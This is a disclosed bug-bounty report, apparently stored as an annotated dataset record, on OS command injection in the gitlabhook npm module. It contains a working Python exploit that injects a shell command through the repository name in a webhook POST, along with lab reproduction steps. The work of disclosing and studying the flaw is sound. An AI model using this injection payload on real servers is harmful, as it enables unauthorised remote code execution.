{
  "reported_to": "Node.js third-party modules",
  "reported_by": "samlyhin ",
  "title": "gitlabhook OS Command Injection",
  "content": "\nI would like to report OS Command Injection in gitlabhook.\nIt allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.\nModule\nmodule name: gitlabhook\nversion: 0.0.17\nnpm page: https://www.npmjs.com/package/gitlabhook\nModule Description\nThis is an easy to use nodeJS based web hook for GitLab.\nModule Stats\n[5] downloads in the last week\nVulnerability\nVulnerability Description\nFunction \"ExecFile\" at line 146 executes commands without any sanitization. User input gets passed directly to this command.\nSteps To Reproduce:\nAn exploit on python3 was created.\nCode 210 Bytes\n1#!/usr/bin/python\n2\n3import requests\n4\n5target = \"http://192.168.126.128:3420\"\n6cmd = r\"touch /tmp/poc.txt\"\n7json = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\n8r = requests.post(target, json)\n9\n10print \"Done.\"\nPlease follow these steps:\nCreate a temporary directory on the filesystem. mkdir /tmp/temp cd /tmp/temp\nInstall the module: npm install gitlabhook\nChange directory: cd node_modules/gitlabhook/\nRun the application: node gitlabhook-server.js\nAt step 4, you should see that the server is up and running. It should send a big message to the terminal, and this message should finish with the line:\nCode 43 Bytes\n1listening for github events on 0.0.0.0:3420\nThis server was set up on Kali Linux machine. This machine has an interface with IP address 192.168.126.128.\nI have another machine on Windows, that can reach this Kali Linux machine by the above IP. This Windows machine has python3 installed, and python requests module installed too.\nSo, edit the exploit and run it.\nCode 263 Bytes\n1#!/usr/bin/python\n2\n3import requests\n4\n5target = \"http://192.168.126.128:3420\" #put target IP and port here\n6cmd = r\"touch /tmp/poc.txt\" #a command to execute\n7json = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\n8r = requests.post(target, json)\n9\n10print (\"Done.\")\nThe exploit above should create a file /tmp/poc.txt on the victim server.\nSo, on the Kali machine, run the next command:\nCode 15 Bytes\n1ls /tmp/poc.txt\nAnd ensure that the file was created.\nAlso it's possible to check this vulnerability without usage of additional windows machine. The above exploit may be run on Kali Linux machine:\nexploit.py:\nCode 254 Bytes\n1#!/bin/python3\n2\n3import requests\n4\n5target = \"http://127.0.0.1:3420\" #put target IP and port here\n6cmd = r\"touch /tmp/poc.txt\" #a command to execute\n7json = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\n8r = requests.post(target, json)\n9\n10print (\"Done.\")\nrun it:\nCode 61 Bytes\n1chmod 755 exploit.py\n2pip3 install requests\n3python3 exploit.py\nand check the result with the following command:\nCode 16 Bytes\n1ls /tmp/poc.txt \nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAn attacker can achieve Remote Code Execution (RCE) without any conditions.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1568385420,
  "report_url": "https://hackerone.com/reports/685447",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the gitlabhook module: npm install gitlabhook"
    ],
    [
      2,
      "Run the server: node gitlabhook-server.js"
    ],
    [
      3,
      "Execute the Python exploit script targeting the server with a command to create a file"
    ],
    [
      4,
      "Verify the file was created on the server: ls /tmp/poc.txt"
    ]
  ],
  "vuln_description": "The gitlabhook module is vulnerable to OS Command Injection via the 'ExecFile' function at line 146, which executes commands without proper sanitization. User input is directly passed to this function, allowing an attacker to execute arbitrary commands on the server.",
  "reason": "The vulnerability involves a straightforward exploitation of unsanitized user input in a command execution function. The attack does not require complex interactions or state manipulations, and the exploit is simple to construct and execute.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves OS Command Injection where user input is passed directly to the 'ExecFile' function without sanitization. This is a server-side issue that does not involve authentication or authorization checks between different user sessions or actions within the same application. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by testing different user sessions and resource IDs, which is not applicable here since the vulnerability does not involve crossing authorization boundaries or manipulating resource access between users.",
    "is_detectable": false
  }
}